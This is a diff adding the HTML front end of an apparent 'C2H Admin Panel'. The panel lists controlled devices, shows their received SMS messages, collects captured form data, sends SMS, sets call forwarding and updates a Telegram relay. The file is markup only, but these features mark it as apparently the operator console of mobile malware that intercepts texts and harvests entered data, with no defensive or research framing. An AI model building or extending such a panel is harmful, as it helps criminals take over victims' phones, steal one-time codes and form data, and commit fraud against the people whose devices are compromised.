@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2H Admin Panel</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="app">
+        <!-- Admin Panel (Main Dashboard) -->
+        <div id="admin-panel">
+            <header>
+                <h1>C2H Admin Panel</h1>
+            </header>
+            <div class="main-buttons">
+                <button id="btn-update-forwarding">UPDATE FORWARDING</button>
+                <button id="btn-update-telegram">UPDATE TELEGRAM</button>
+            </div>
+            <div id="device-list" class="device-list-container">
+                <!-- Device cards will be inserted here by JavaScript -->
+            </div>
+        </div>
+
+        <!-- Device Control Panel -->
+        <div id="device-control-panel" style="display: none;">
+            <header>
+                <button id="btn-back-to-admin">← Back</button>
+                <h1>Device Control</h1>
+                <p id="controlling-device-id">Controlling: </p>
+            </header>
+            <div class="control-buttons">
+                <button id="btn-get-forms">GET FORMS</button>
+                <button id="btn-send-sms">SEND SMS</button>
+                <button id="btn-call-forwarding" class="full-width">CALL FORWARDING</button>
+            </div>
+            <div class="sms-section">
+                <h2>Received SMS</h2>
+                <div id="sms-list" class="sms-list-container">
+                    <!-- SMS items will be inserted here -->
+                </div>
+            </div>
+        </div>
+        
+        <!-- Form List Page -->
+        <div id="form-list-panel" style="display: none;">
+             <header>
+                <button id="btn-back-to-control">← Back</button>
+                <h1>Form Data List</h1>
+            </header>
+            <div id="form-list" class="form-list-container">
+                <!-- Form data will be inserted here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Dialogs/Pop-ups -->
+    <div id="dialog-overlay" class="dialog-overlay" style="display: none;">
+        <div id="dialog-box" class="dialog-box">
+            <!-- Dialog content will be injected here -->
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
